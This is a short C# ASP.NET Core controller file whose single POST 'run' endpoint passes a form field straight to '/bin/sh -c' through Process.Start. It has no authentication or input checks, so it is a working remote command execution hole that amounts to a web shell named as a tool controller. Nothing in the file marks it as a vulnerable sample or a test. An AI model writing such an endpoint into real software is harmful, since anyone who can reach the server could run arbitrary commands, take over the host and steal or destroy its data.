using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;

class ToolController : ControllerBase {
    [HttpPost("run")]
    public void Run([FromForm] string command) {
        Process.Start("/bin/sh", "-c " + command);
    }
}
